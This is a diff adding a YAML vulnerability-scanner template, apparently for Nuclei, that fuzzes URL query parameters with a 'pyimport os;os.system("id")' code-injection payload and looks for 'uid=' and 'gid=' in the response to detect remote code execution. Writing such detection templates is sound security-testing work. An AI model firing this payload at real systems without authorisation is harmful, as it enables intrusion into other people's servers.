@@ -1,0 +1,32 @@
+id: pyimport-rce
+
+info:
+  name: Pyimport Fuzzing RCE
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - 'pyimport os;os.system("id");f=function f2(){};'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: postfix
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
